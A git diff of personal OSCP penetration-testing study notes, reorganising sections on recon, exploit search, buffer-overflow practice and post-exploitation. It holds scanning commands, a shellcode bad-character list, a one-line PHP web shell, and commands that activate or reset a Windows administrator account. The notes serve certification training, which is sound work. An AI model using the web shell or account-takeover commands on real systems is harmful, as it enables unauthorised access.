@@ -1,9 +1,7 @@
 # OSCP Notes
 My notes on OSCP
- 
-## CLI Notes
 
-### Lab
+### Lab Notes
 Setup a good folder/file naming structure to organize your work. I have three main folders:
 - exploits: work-in-progress info
     - host1
@@ -23,12 +21,7 @@ win="rdesktop -u username -p password 1.2.3.4"
 source .bashrc
 ```
 
-Reset Windows user password
-```
-net user administrator newpassword
-```
-
-### Kali
+### Kali-specific Notes
 Search exploits
 ```
 searchsploit wordpress escalation
@@ -36,10 +29,15 @@ searchsploit wordpress escalation
 cp /usr/share/exploitdb/exploits/php/webapps/12345.txt ./
 ````
 
-## Recon
+### Recon
 NMAP
 ```bash
-nmap -A -T4 --script vulners -oN test.nmap {TARGETS}
+nmap -A -T4 --script vulners -oN out.nmap {TARGETS}
+```
+
+Target a specific type of scripts with wildcards (e.g. smb*)
+```bash
+nmap -T4 --script ftp* -p 21 -oN out.nmap {TARGETS}
 ```
 
 Add addtional vulnerability scanning capability to NMAP
@@ -51,13 +49,13 @@ gobuster
 
 [Gobuster Package Description](https://tools.kali.org/web-applications/gobuster)
 
-## Useful Tools
-MS17-010
+## Useful Tools / Cheatsheets
+Handy tools/cheatsheets for lab
 
+MS17-010
 [AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
 
 msfvenom *replaced msfpayload in older articles*
-
 [Msfvenom Cheat Sheet](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/)
 
 ## Useful Bookmarks
@@ -82,7 +80,6 @@ Detailed explanation on how tools/exploits work.
 [Java RMI](https://github.com/JoyChou93/java-sec-code/wiki/Java-RMI)
 
 ### Shell Code
-
 [0x7 Exploit Tutorial: Bad Character Analysis](http://www.primalsecurity.net/0x7-exploit-tutorial-bad-character-analysis/)
 ```python
 bad_chars = ""
@@ -104,6 +101,15 @@ bad_chars += "xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0"
 bad_chars += "xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff"
 ```
 
+### Buffer Overflow Practice
+Lots of scripts on github but I would recommend setup XP/Win7 box (and Immunity debugger/Mona) and practice
+
+MiniShare 1.4.1
+[MiniShare 1.4.1 - Remote Buffer Overflow (1)](https://www.exploit-db.com/exploits/616)
+Software
+[MiniShare 1.4.1](https://www.google.com/search?q=minishare-1.4.1.zip)
+
+
 ## Reverse Shell
 PHP calls perl for reverse shell (quotes must be escaped properly - test it locally first!)
 ```php
@@ -119,7 +125,15 @@ PHP
 <?php echo shell_exec($_GET["cmd"]); ?>
 ```
 
-## Exam
+## Post-Exploitation
+
+### Windows
+Reset/activate account
+```powershell
+net user administrator /active:yes password123
+```
+
+## Exam related links
 [A Script Kiddie’s guide to Passing OSCP on your first attempt](https://forum.hackthebox.eu/discussion/1730/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt)
 
 [Pentest Book](https://chryzsh.gitbooks.io/pentestbook/content/list_of_common_ports.html)
